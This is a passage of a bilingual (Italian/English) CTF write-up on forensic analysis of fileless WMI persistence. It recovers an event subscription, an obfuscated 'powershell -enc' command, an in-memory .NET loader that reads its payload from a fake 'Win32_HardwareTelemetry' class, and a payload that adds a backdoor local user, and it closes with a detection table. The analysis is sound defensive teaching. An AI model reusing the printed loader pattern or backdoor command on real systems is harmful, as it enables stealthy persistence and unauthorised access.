+    <p data-it="Una WMI Event Subscription è fatta di tre pezzi: un &lt;code&gt;__EventFilter&lt;/code&gt; (il trigger, una query WQL — qui a tema «ore piccole»), un &lt;code&gt;__EventConsumer&lt;/code&gt; (l'azione) e un &lt;code&gt;__FilterToConsumerBinding&lt;/code&gt; che li lega. Non servono parser esotici: &lt;code&gt;strings&lt;/code&gt; + &lt;code&gt;grep&lt;/code&gt; su &lt;code&gt;OBJECTS.DATA&lt;/code&gt; tirano fuori le istanze reali." data-en="A WMI Event Subscription has three parts: an &lt;code&gt;__EventFilter&lt;/code&gt; (the trigger, a WQL query — here on a &quot;small hours&quot; theme), an &lt;code&gt;__EventConsumer&lt;/code&gt; (the action) and a &lt;code&gt;__FilterToConsumerBinding&lt;/code&gt; tying them. No exotic parser needed: &lt;code&gt;strings&lt;/code&gt; + &lt;code&gt;grep&lt;/code&gt; on &lt;code&gt;OBJECTS.DATA&lt;/code&gt; surface the real instances.">Una WMI Event Subscription è fatta di tre pezzi: un <code>__EventFilter</code> (il trigger, una query WQL — qui a tema «ore piccole»), un <code>__EventConsumer</code> (l'azione) e un <code>__FilterToConsumerBinding</code> che li lega. Non servono parser esotici: <code>strings</code> + <code>grep</code> su <code>OBJECTS.DATA</code> tirano fuori le istanze reali.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="neutral">strings -a OBJECTS.DATA \</span>
+<span class="neutral">  | grep -iE 'EventConsumer|EventFilter|FilterToConsumerBinding' \</span>
+<span class="neutral">  | sort | uniq -c | sort -rn | head</span>
+<span class="warn">__FilterToConsumerBinding</span>   # c'e una subscription REALE
+<span class="warn">CommandLineEventConsumer</span>    # il consumer che ESEGUE un comando</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="neutral">strings -a OBJECTS.DATA \</span>
+<span class="neutral">  | grep -iE 'EventConsumer|EventFilter|FilterToConsumerBinding' \</span>
+<span class="neutral">  | sort | uniq -c | sort -rn | head</span>
+<span class="warn">__FilterToConsumerBinding</span>   # there IS a real subscription
+<span class="warn">CommandLineEventConsumer</span>    # the consumer that RUNS a command</pre>
+</div></div>
+
+    <h2 data-it="[03] Il comando: PowerShell offuscato" data-en="[03] The command: obfuscated PowerShell" id='loader'>[03] Il comando: PowerShell offuscato</h2>
+    <p data-it="Il &lt;code&gt;CommandLineEventConsumer&lt;/code&gt; ha un &lt;code&gt;CommandLineTemplate&lt;/code&gt;: è il comando che scatta al trigger. Lo estraggo, e trovo un classico &lt;code&gt;powershell -enc&lt;/code&gt; — dove &lt;code&gt;-enc&lt;/code&gt; vuole base64 di testo &lt;strong&gt;UTF-16LE&lt;/strong&gt;." data-en="The &lt;code&gt;CommandLineEventConsumer&lt;/code&gt; carries a &lt;code&gt;CommandLineTemplate&lt;/code&gt;: the command fired on trigger. I extract it and find a classic &lt;code&gt;powershell -enc&lt;/code&gt; — where &lt;code&gt;-enc&lt;/code&gt; expects base64 of &lt;strong&gt;UTF-16LE&lt;/strong&gt; text.">Il <code>CommandLineEventConsumer</code> ha un <code>CommandLineTemplate</code>: è il comando che scatta al trigger. Lo estraggo, e trovo un classico <code>powershell -enc</code> — dove <code>-enc</code> vuole base64 di testo <strong>UTF-16LE</strong>.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="neutral">strings -a OBJECTS.DATA | grep -oE 'powershell.exe .*-enc [A-Za-z0-9+/=]+'</span>
+<span class="comment"># cmd /C powershell.exe -Sta -Nop -Window Hidden -enc JABmAGkAbABlAC...</span>
+<span class="neutral"></span>
+<span class="comment"># -enc = base64 di UTF-16LE: decodifico</span>
+<span class="neutral">ENC=$(strings -a OBJECTS.DATA | grep -oE '[-]enc [A-Za-z0-9+/=]+' | head -1 | awk '{print $2}')</span>
+<span class="neutral">echo $ENC | base64 -d | iconv -f UTF-16LE -t UTF-8</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="neutral">strings -a OBJECTS.DATA | grep -oE 'powershell.exe .*-enc [A-Za-z0-9+/=]+'</span>
+<span class="comment"># cmd /C powershell.exe -Sta -Nop -Window Hidden -enc JABmAGkAbABlAC...</span>
+<span class="neutral"></span>
+<span class="comment"># -enc = base64 of UTF-16LE: decode it</span>
+<span class="neutral">ENC=$(strings -a OBJECTS.DATA | grep -oE '[-]enc [A-Za-z0-9+/=]+' | head -1 | awk '{print $2}')</span>
+<span class="neutral">echo $ENC | base64 -d | iconv -f UTF-16LE -t UTF-8</span></pre>
+</div></div>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="neutral">$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;</span>
+<span class="neutral">$o = New-Object IO.MemoryStream;</span>
+<span class="neutral">$d = New-Object IO.Compression.DeflateStream(</span>
+<span class="neutral">       [IO.MemoryStream][Convert]::FromBase64String($file),</span>
+<span class="neutral">       [IO.Compression.CompressionMode]::Decompress);</span>
+<span class="comment"># ...legge i byte decompressi...</span>
+<span class="danger">[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,...)</span>   # .NET in memoria</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="neutral">$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;</span>
+<span class="neutral">$o = New-Object IO.MemoryStream;</span>
+<span class="neutral">$d = New-Object IO.Compression.DeflateStream(</span>
+<span class="neutral">       [IO.MemoryStream][Convert]::FromBase64String($file),</span>
+<span class="neutral">       [IO.Compression.CompressionMode]::Decompress);</span>
+<span class="comment"># ...reads the decompressed bytes...</span>
+<span class="danger">[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,...)</span>   # .NET in memory</pre>
+</div></div>
+    <div class="callout-red">
+  <div class="callout-label" data-it="// cosa fa il loader" data-en="// what the loader does">// cosa fa il loader</div>
+  <p data-it="Non tocca il disco. Legge una &lt;strong&gt;proprietà di una classe WMI&lt;/strong&gt; (&lt;code&gt;ConfigData&lt;/code&gt; di &lt;code&gt;Win32_HardwareTelemetry&lt;/code&gt;), la decodifica base64, la &lt;strong&gt;decomprime (deflate)&lt;/strong&gt; e carica il risultato come &lt;strong&gt;assembly .NET direttamente in memoria&lt;/strong&gt; con &lt;code&gt;Reflection.Assembly::Load&lt;/code&gt;. Il payload non esiste come file: vive dentro il DB WMI. Ecco la «hidden custom configuration data» dell'itinerario." data-en="It never touches disk. It reads a &lt;strong&gt;property off a WMI class&lt;/strong&gt; (&lt;code&gt;ConfigData&lt;/code&gt; of &lt;code&gt;Win32_HardwareTelemetry&lt;/code&gt;), base64-decodes it, &lt;strong&gt;deflate-decompresses&lt;/strong&gt; it, and loads the result as a &lt;strong&gt;.NET assembly straight into memory&lt;/strong&gt; via &lt;code&gt;Reflection.Assembly::Load&lt;/code&gt;. The payload exists as no file: it lives inside the WMI DB. That's the &quot;hidden custom configuration data&quot; from the itinerary.">Non tocca il disco. Legge una <strong>proprietà di una classe WMI</strong> (<code>ConfigData</code> di <code>Win32_HardwareTelemetry</code>), la decodifica base64, la <strong>decomprime (deflate)</strong> e carica il risultato come <strong>assembly .NET direttamente in memoria</strong> con <code>Reflection.Assembly::Load</code>. Il payload non esiste come file: vive dentro il DB WMI. Ecco la «hidden custom configuration data» dell'itinerario.</p>
+</div>
+
+    <h2 data-it="[04] La classe malevola e il suo payload" data-en="[04] The malicious class and its payload" id='class'>[04] La classe malevola e il suo payload</h2>
+    <p data-it="&lt;code&gt;Win32_HardwareTelemetry&lt;/code&gt; &lt;em&gt;non&lt;/em&gt; è una classe WMI standard: è stata creata dall'attaccante con un nome che sembra legittimo (mimetismo). La sua proprietà &lt;code&gt;ConfigData&lt;/code&gt; è il magazzino del payload. La cerco nel repository: è una lunga stringa base64 (inizia con &lt;code&gt;7VZ...&lt;/code&gt;, tipico di uno stream deflate)." data-en="&lt;code&gt;Win32_HardwareTelemetry&lt;/code&gt; is &lt;em&gt;not&lt;/em&gt; a standard WMI class: the attacker created it with a legit-looking name (mimicry). Its &lt;code&gt;ConfigData&lt;/code&gt; property is the payload store. I look for it in the repository: a long base64 string (starts with &lt;code&gt;7VZ...&lt;/code&gt;, typical of a deflate stream)."><code>Win32_HardwareTelemetry</code> <em>non</em> è una classe WMI standard: è stata creata dall'attaccante con un nome che sembra legittimo (mimetismo). La sua proprietà <code>ConfigData</code> è il magazzino del payload. La cerco nel repository: è una lunga stringa base64 (inizia con <code>7VZ...</code>, tipico di uno stream deflate).</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># la classe custom e la proprieta che tiene il payload</span>
+<span class="neutral">strings -a OBJECTS.DATA | grep -iE 'Win32_HardwareTelemetry|ConfigData' | sort -u</span>
+<span class="ok">Win32_HardwareTelemetry ... ConfigData</span>   # nome finto-legittimo, dato embedded</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># the custom class and the property holding the payload</span>
+<span class="neutral">strings -a OBJECTS.DATA | grep -iE 'Win32_HardwareTelemetry|ConfigData' | sort -u</span>
+<span class="ok">Win32_HardwareTelemetry ... ConfigData</span>   # fake-legit name, embedded data</pre>
+</div></div>
+
+    <h2 data-it="[05] Ricostruire il payload .NET" data-en="[05] Rebuild the .NET payload" id='rebuild'>[05] Ricostruire il payload .NET</h2>
+    <p data-it="Rifaccio a mano quello che farebbe il loader: estraggo il blob &lt;code&gt;ConfigData&lt;/code&gt;, lo decodifico da base64 e lo decomprimo. Attenzione: &lt;code&gt;DeflateStream&lt;/code&gt; usa &lt;strong&gt;raw deflate&lt;/strong&gt; (senza header zlib/gzip) → in Python è &lt;code&gt;zlib.decompress(dati, -15)&lt;/code&gt;. Il risultato inizia con &lt;code&gt;MZ&lt;/code&gt;: è un PE, un assembly .NET." data-en="I redo by hand what the loader would do: extract the &lt;code&gt;ConfigData&lt;/code&gt; blob, base64-decode and decompress it. Careful: &lt;code&gt;DeflateStream&lt;/code&gt; is &lt;strong&gt;raw deflate&lt;/strong&gt; (no zlib/gzip header) → in Python that's &lt;code&gt;zlib.decompress(data, -15)&lt;/code&gt;. The result starts with &lt;code&gt;MZ&lt;/code&gt;: it's a PE, a .NET assembly.">Rifaccio a mano quello che farebbe il loader: estraggo il blob <code>ConfigData</code>, lo decodifico da base64 e lo decomprimo. Attenzione: <code>DeflateStream</code> usa <strong>raw deflate</strong> (senza header zlib/gzip) → in Python è <code>zlib.decompress(dati, -15)</code>. Il risultato inizia con <code>MZ</code>: è un PE, un assembly .NET.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># 1) estrai il blob ConfigData (il base64 lungo che inizia con 7VZ)</span>
+<span class="neutral">strings -a OBJECTS.DATA | grep -oE '[A-Za-z0-9+/]{200,}={0,2}' | grep '^7VZ' &gt; cfg.b64</span>
+<span class="neutral"></span>
+<span class="comment"># 2) base64 -&gt; RAW deflate (-15) -&gt; assembly</span>
+<span class="neutral">python3 -c "import base64,zlib; open('payload.bin','wb').write(zlib.decompress(base64.b64decode(open('cfg.b64').read().strip()), -15))"</span>
+<span class="neutral"></span>
+<span class="neutral">file payload.bin</span>
+<span class="ok">PE32 executable ... Mono/.Net assembly</span>   # payload ricostruito</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># 1) extract the ConfigData blob (the long base64 starting with 7VZ)</span>
+<span class="neutral">strings -a OBJECTS.DATA | grep -oE '[A-Za-z0-9+/]{200,}={0,2}' | grep '^7VZ' &gt; cfg.b64</span>
+<span class="neutral"></span>
+<span class="comment"># 2) base64 -&gt; RAW deflate (-15) -&gt; assembly</span>
+<span class="neutral">python3 -c "import base64,zlib; open('payload.bin','wb').write(zlib.decompress(base64.b64decode(open('cfg.b64').read().strip()), -15))"</span>
+<span class="neutral"></span>
+<span class="neutral">file payload.bin</span>
+<span class="ok">PE32 executable ... Mono/.Net assembly</span>   # payload rebuilt</pre>
+</div></div>
+
+    <h2 data-it="[06] La flag dentro l'assembly" data-en="[06] The flag inside the assembly" id='flag'>[06] La flag dentro l'assembly</h2>
+    <p data-it="Le stringhe dei letterali .NET sono in &lt;strong&gt;UTF-16&lt;/strong&gt;, quindi le cerco con &lt;code&gt;strings -e l&lt;/code&gt;. Salta fuori l'azione vera del malware — e un dettaglio da manuale." data-en="The .NET string literals are &lt;strong&gt;UTF-16&lt;/strong&gt;, so I search with &lt;code&gt;strings -e l&lt;/code&gt;. Out comes the malware's real action — and a textbook detail.">Le stringhe dei letterali .NET sono in <strong>UTF-16</strong>, quindi le cerco con <code>strings -e l</code>. Salta fuori l'azione vera del malware — e un dettaglio da manuale.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="neutral">strings -a -e l payload.bin | grep -iE 'net user|halt|mismatch'</span>
+<span class="danger">/c net user patch VEhN████████████████████████████████████ /add</span>   # crea un backdoor; la password E la flag (base64, oscurata)
+<span class="warn">Execution halted: Environment mismatch.</span>    # guard: gira solo sulla macchina giusta (bytelotusdc)</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="neutral">strings -a -e l payload.bin | grep -iE 'net user|halt|mismatch'</span>
+<span class="danger">/c net user patch VEhN████████████████████████████████████ /add</span>   # creates a backdoor; the password IS the flag (base64, masked)
+<span class="warn">Execution halted: Environment mismatch.</span>    # guard: only runs on the right host (bytelotusdc)</pre>
+</div></div>
+    <p data-it="Il payload crea un utente locale &lt;code&gt;patch&lt;/code&gt; (nome ironico: la «patch» che apre la porta) e ne imposta la password. Quella password è la flag, codificata in base64. La decodifico sulla mia istanza — il valore te lo tieni tu:" data-en="The payload creates a local user &lt;code&gt;patch&lt;/code&gt; (an ironic name: the &quot;patch&quot; that opens the door) and sets its password. That password is the flag, base64-encoded. I decode it on my own instance — the value stays with you:">Il payload crea un utente locale <code>patch</code> (nome ironico: la «patch» che apre la porta) e ne imposta la password. Quella password è la flag, codificata in base64. La decodifico sulla mia istanza — il valore te lo tieni tu:</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="neutral">echo 'VEhN████████████████████████████████████' | base64 -d</span>
+THM{<span class="redaction">████████████████████</span>}   # oscurata: policy</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="neutral">echo 'VEhN████████████████████████████████████' | base64 -d</span>
+THM{<span class="redaction">████████████████████</span>}   # redacted: policy</pre>
+</div></div>
+    <!-- policy: la flag è sempre oscurata, per scelta editoriale -->
+    <div class="callout">
+      <div class="callout-label" data-it="// flag — OSCURATA" data-en="// flag — REDACTED">// flag — OSCURATA</div>
+      <div class="code-block"><pre><span class="ok">THM{</span><span class="redaction" aria-label="flag oscurata">████████████████████</span><span class="ok">}</span></pre></div>
+      <p data-it="La flag qui non la trovi: il valore in sé non insegna niente, e mezzo divertimento è arrivarci. La metodologia sopra è completa e riproducibile — l'ultimo &lt;code&gt;Enter&lt;/code&gt; lo batti tu." data-en="You won't find the flag here: the value itself teaches nothing, and half the fun is getting there. The methodology above is complete and reproducible — the last &lt;code&gt;Enter&lt;/code&gt; is yours to press.">La flag qui non la trovi: il valore in sé non insegna niente, e mezzo divertimento è arrivarci. La metodologia sopra è completa e riproducibile — l'ultimo <code>Enter</code> lo batti tu.</p>
+    </div>
+
+    <h2 data-it="[07] Difesa" data-en="[07] Defence" id='defence'>[07] Difesa</h2>
+    <table>
+      <thead><tr><th data-it="Debolezza / TTP" data-en="Weakness / TTP">Debolezza / TTP</th><th data-it="Rilevamento &amp; correzione" data-en="Detection &amp; fix">Rilevamento & correzione</th></tr></thead>
+      <tbody>
+        <tr><td data-it="Persistenza WMI Event Subscription (fileless)" data-en="WMI Event Subscription persistence (fileless)">Persistenza WMI Event Subscription (fileless)</td><td class="ok" data-it="Sysmon eventi 19/20/21 (WmiFilter/Consumer/Binding); &lt;code&gt;Get-WmiObject -Namespace root\subscription __EventConsumer&lt;/code&gt;; Autoruns tab «WMI»" data-en="Sysmon events 19/20/21 (WmiFilter/Consumer/Binding); &lt;code&gt;Get-WmiObject -Namespace root\subscription __EventConsumer&lt;/code&gt;; Autoruns &quot;WMI&quot; tab">Sysmon eventi 19/20/21 (WmiFilter/Consumer/Binding); <code>Get-WmiObject -Namespace root\subscription __EventConsumer</code>; Autoruns tab «WMI»</td></tr>
+        <tr><td data-it="Payload nascosto in una classe WMI custom" data-en="Payload hidden in a custom WMI class">Payload nascosto in una classe WMI custom</td><td class="ok" data-it="Baseline delle classi in &lt;code&gt;root\cimv2&lt;/code&gt;; allarme su classi/proprietà anomale con blob grandi; parser offline (python-cim / PyWMIPersistenceFinder)" data-en="Baseline the classes in &lt;code&gt;root\cimv2&lt;/code&gt;; alert on odd classes/properties holding large blobs; offline parsers (python-cim / PyWMIPersistenceFinder)">Baseline delle classi in <code>root\cimv2</code>; allarme su classi/proprietà anomale con blob grandi; parser offline (python-cim / PyWMIPersistenceFinder)</td></tr>
+        <tr><td data-it="&lt;code&gt;powershell -enc&lt;/code&gt; + &lt;code&gt;Assembly::Load&lt;/code&gt; in memoria" data-en="&lt;code&gt;powershell -enc&lt;/code&gt; + in-memory &lt;code&gt;Assembly::Load&lt;/code&gt;"><code>powershell -enc</code> + <code>Assembly::Load</code> in memoria</td><td class="ok" data-it="ScriptBlock &amp;amp; Module logging; AMSI; allarme su &lt;code&gt;-enc&lt;/code&gt;/&lt;code&gt;FromBase64String&lt;/code&gt;/&lt;code&gt;Reflection.Assembly&lt;/code&gt; negli EventConsumer" data-en="ScriptBlock &amp;amp; Module logging; AMSI; alert on &lt;code&gt;-enc&lt;/code&gt;/&lt;code&gt;FromBase64String&lt;/code&gt;/&lt;code&gt;Reflection.Assembly&lt;/code&gt; in EventConsumers">ScriptBlock &amp; Module logging; AMSI; allarme su <code>-enc</code>/<code>FromBase64String</code>/<code>Reflection.Assembly</code> negli EventConsumer</td></tr>
+        <tr><td data-it="Backdoor via &lt;code&gt;net user ... /add&lt;/code&gt;" data-en="Backdoor via &lt;code&gt;net user ... /add&lt;/code&gt;">Backdoor via <code>net user ... /add</code></td><td class="ok" data-it="Event ID 4720 (utente creato); allarme su creazioni utente fuori orario / da processi WMI" data-en="Event ID 4720 (user created); alert on off-hours user creation / from WMI processes">Event ID 4720 (utente creato); allarme su creazioni utente fuori orario / da processi WMI</td></tr>
+      </tbody>
+    </table>
+    <div class="callout-green">
+  <div class="callout-label" data-it="// verdetto" data-en="// verdict">// verdetto</div>
+  <p data-it="Nessun file sospetto, nessuna chiave Run, niente in Scheduled Tasks — eppure la macchina «timbra» ogni notte. Tutta la catena vive dentro il DB WMI: un trigger, un consumer che lancia PowerShell, e una classe finto-legittima che fa da hard-disk al payload. La lezione: &lt;strong&gt;il repository WMI è codice e dati eseguibili quanto il filesystem&lt;/strong&gt; — va incluso nel triage, non trattato come rumore di sistema. E occhio ai nomi che «suonano Microsoft»: &lt;code&gt;Win32_&lt;/code&gt; non è un lasciapassare." data-en="No suspicious file, no Run key, nothing in Scheduled Tasks — yet the box &quot;clocks in&quot; every night. The whole chain lives inside the WMI DB: a trigger, a consumer launching PowerShell, and a fake-legit class acting as the payload's hard drive. The lesson: &lt;strong&gt;the WMI repository is executable code and data just like the filesystem&lt;/strong&gt; — include it in triage, don't treat it as system noise. And beware names that &quot;sound Microsoft&quot;: &lt;code&gt;Win32_&lt;/code&gt; is not a free pass.">Nessun file sospetto, nessuna chiave Run, niente in Scheduled Tasks — eppure la macchina «timbra» ogni notte. Tutta la catena vive dentro il DB WMI: un trigger, un consumer che lancia PowerShell, e una classe finto-legittima che fa da hard-disk al payload. La lezione: <strong>il repository WMI è codice e dati eseguibili quanto il filesystem</strong> — va incluso nel triage, non trattato come rumore di sistema. E occhio ai nomi che «suonano Microsoft»: <code>Win32_</code> non è un lasciapassare.</p>
+</div>
+
+  </div><!-- /article-body -->
+  </article>
+  </main>
+
+  <div class="share-wrap">
+    <span class="share-lbl" data-it="// condividi" data-en="// share">// condividi</span>
+    <div class="share-btns">
+      <a class="share-btn" href="https://x.com/intent/tweet?url=https%3A%2F%2Fpaolocostanzo.github.io%2Fctf%2Fhacker-holidays-2026%2Fafter-hours%2F&via=PaoloCostanzoit" target="_blank" rel="noopener">X / Twitter</a>
+      <a class="share-btn" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fpaolocostanzo.github.io%2Fctf%2Fhacker-holidays-2026%2Fafter-hours%2F" target="_blank" rel="noopener">LinkedIn</a>
+      <button class="share-btn" onclick="copyLink(this)" data-it="copia link" data-en="copy link">copia link</button>
+    </div>
+  </div>
+
+  <aside class="author-box">
+    <span class="ab-label" data-it="// L'autore" data-en="// The author">// L'autore</span>
+    <div class="ab-name">Paolo Costanzo</div>
+    <div class="ab-role" data-it="Ricercatore indipendente di sicurezza · Co-Founder &amp;amp; CEO @ CoDe RTD · Docente di Cybersecurity &amp;amp; AWS @ ITS ICT Piemonte" data-en="Independent Security Researcher · Co-Founder &amp;amp; CEO @ CoDe RTD · Professor of Cybersecurity &amp;amp; AWS @ ITS ICT Piemonte">Ricercatore indipendente di sicurezza · Co-Founder &amp; CEO @ CoDe RTD · Docente di Cybersecurity &amp; AWS @ ITS ICT Piemonte</div>
+    <p class="ab-bio" data-it="Ricerca indipendente su cloud security, sistemi agentici e AI, threat intelligence, reti e validazione offensiva autorizzata. Ogni report dichiara metodologia, limiti e fonti, e dove possibile è riproducibile." data-en="Independent research on cloud security, agentic AI systems, threat intelligence, networks and authorized offensive validation. Every report states its methodology, limitations and sources, and is reproducible where possible.">Ricerca indipendente su cloud security, sistemi agentici e AI, threat intelligence, reti e validazione offensiva autorizzata. Ogni report dichiara metodologia, limiti e fonti, e dove possibile è riproducibile.</p>
+    <div class="ab-links">
+      <a class="ab-cta" data-it="Scrivimi →" data-en="Get in touch →" href="mailto:me@paolocostanzo.com">Scrivimi →</a>
+      <a href="https://www.paolocostanzo.com" target="_blank" rel="noopener noreferrer">paolocostanzo.com</a>
+      <a href="https://www.linkedin.com/in/paolocostanzoit/" target="_blank" rel="noopener noreferrer">LinkedIn</a>
+      <a href="https://github.com/paolocostanzo" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </div>
+  </aside>
+  <div class="article-footer">
+    <a data-it="← tutti i writeup dell'evento" data-en="← all event writeups" href="/ctf/hacker-holidays-2026/">← tutti i writeup dell'evento</a>
+    <span class="footer-copy" data-it="© 2026 NonèCostanzo — lab autorizzato, per scopi educativi" data-en="© 2026 NonèCostanzo — authorised lab, for educational purposes">© 2026 NonèCostanzo — lab autorizzato, per scopi educativi</span>
+  </div>
+  <button id="back-top" onclick="window.scrollTo({top:0,behavior:'smooth'})" data-it="↑ top" data-en="↑ top">↑ top</button>
+  <script>
+    function setLang(lang){
+      document.querySelectorAll('[data-'+lang+']').forEach(el=>{const val=el.getAttribute('data-'+lang);
+        if(el.tagName==='META'){el.setAttribute('content',val);}else if(el.tagName==='TITLE'){document.title=val;}else{el.innerHTML=val;}});
+      document.documentElement.lang=lang;
+      document.querySelectorAll('.lang-btn').forEach(b=>{const on=b.textContent.toLowerCase()===lang;b.classList.toggle('active',on);b.setAttribute('aria-pressed',on);});
+      document.querySelectorAll('.lang-it').forEach(el=>el.style.display=lang==='en'?'none':'');
+      document.querySelectorAll('.lang-en').forEach(el=>el.style.display=lang==='en'?'block':'none');
+      localStorage.setItem('lang',lang);
+    }
+    function copyLink(btn){const en=document.documentElement.lang==='en';
+      navigator.clipboard.writeText(window.location.href).then(()=>{btn.textContent=en?'copied ✓':'copiato ✓';btn.classList.add('ok');
+      setTimeout(()=>{btn.textContent=en?'copy link':'copia link';btn.classList.remove('ok');},2000);});}
+    const s=localStorage.getItem('lang'); if(s&&s!=='it')setLang(s);
+    const bar=document.getElementById('read-bar'),bt=document.getElementById('back-top');
+    window.addEventListener('scroll',()=>{const h=document.documentElement;bar.style.width=(h.scrollTop/(h.scrollHeight-h.clientHeight))*100+'%';bt.classList.toggle('vis',h.scrollTop>400);},{passive:true});
+  </script>
+</body>
+</html>
